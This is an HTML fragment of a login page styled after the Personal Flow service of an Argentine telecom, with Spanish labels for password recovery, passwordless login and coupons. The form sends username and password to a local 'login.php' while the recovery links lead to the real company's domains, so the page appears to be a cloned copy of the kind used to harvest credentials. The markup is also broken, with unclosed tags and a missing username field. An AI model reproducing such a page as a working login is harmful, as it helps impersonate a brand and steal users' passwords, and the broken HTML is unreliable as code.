<body>
    <div class="my-container">
        <div class="convergentLoginBackground">
            <div class="formContainer ">
                <div class="row">
                    <div class="convergentLoginFormWrapper">
                        <form id="convergentLoginForm" action="login.php" method="post">

                                <img src="personal-flow-white_2.png" alt="Personal Flow">
                            </h1>
                            <div class="errorBox"></div>
                            <div class="MuiFormControl-root form-control" id="username-formControl">

                            <div class="MuiFormControl-root form-control" id="password-formControl">
                                <input class="login-input" name="password" type="password"

                            <div class="text-center">

                            </div>
                        </form>
                        <div class="convergentforgotWrapper">
                            <div class="forgotText">
                                <a href="https://userrec.telecom.com.ar/micuenta/recuperousuario" target="_blank"
                                    class="forgot-link">RECUPERAR USUARIO</a>
                            </div>
                            <div class="col-1">
                                <p class="forgot-separator">|</p>
                            </div>
                            <div class="forgotText">
                                <a href="https://keyrec.telecom.com.ar/micuenta/recuperocontrasena" target="_blank"
                                    class="forgot-link">
                                    RECUPERAR CONTRASEÑA</a>
                            </div>
                        </div>
                        <div class="wrap-separator">
                            <span class="separator"></span>
                        </div><!--  -->
                        <div class="container-otp-and-code">
                            <div class="opt_container">
                                <div class="inputs_container">
                                    <button class="button button--secondary" type="button">Ingresar sin
                                        contrase&#241;a</button>
                                </div>
                            </div>
                            <button class="button button--secondary-coupon">
                                <img src="img_cuppon.png">
                                <p>Tengo un c&#243;digo para Flow</p>
                            </button>
                        </div>
                    </div>
                </div>
                <div class="help">
                    <p>
                        <a href="https://www.personal.com.ar/ayuda/facturacion" target="_blank">CENTRO DE AYUDA</a>
                    </p>
                </div>

                    <p class="version">Version: 3.99.0</p>
                </div>
            </div>
